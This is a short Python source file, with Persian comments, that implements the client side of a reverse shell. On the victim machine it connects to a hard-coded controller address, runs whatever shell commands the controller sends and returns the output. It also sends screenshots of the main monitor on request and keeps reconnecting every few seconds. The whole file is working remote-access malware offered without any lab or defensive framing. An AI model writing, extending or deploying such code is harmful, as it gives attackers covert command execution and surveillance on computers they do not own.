import socket
import subprocess
import os
import time
from mss import mss

def take_screenshot():
    with mss() as sct:
        screenshot = sct.grab(sct.monitors[1])  # گرفتن اسکرین‌شات از مانیتور اصلی
        return screenshot.rgb

def start_client(server_host='192.168.1.80', server_port=9999):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_host, server_port))

            while True:
                # ارسال دایرکتوری فعلی به سرور
                current_dir = os.getcwd()
                client_socket.send(current_dir.encode())

                # دریافت دستور از سرور
                command = client_socket.recv(1024).decode().strip()

                if not command:
                    break  # اگر سرور قطع شود

                if command.lower() == 'exit':
                    break

                # اگر دستور اسکرین‌شات بود
                if command.lower() == 'screenshot':
                    screenshot_data = take_screenshot()
                    client_socket.send(screenshot_data)
                    continue

                # اجرای دستورات
                if command.startswith("cd "):
                    # تغییر دایرکتوری
                    try:
                        os.chdir(command[3:])
                        response = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        response = f"Error: {e}"
                else:
                    # اجرای دستورات شل
                    response = subprocess.getoutput(command)

                # ارسال پاسخ به سرور
                client_socket.send(response.encode())

        except ConnectionRefusedError:
            time.sleep(5)  # منتظر بماند و دوباره تلاش کند
        except ConnectionResetError:
            time.sleep(5)  # منتظر بماند و دوباره تلاش کند
        except Exception as e:
            time.sleep(5)  # منتظر بماند و دوباره تلاش کند
        finally:
            client_socket.close()

if __name__ == "__main__":
    start_client()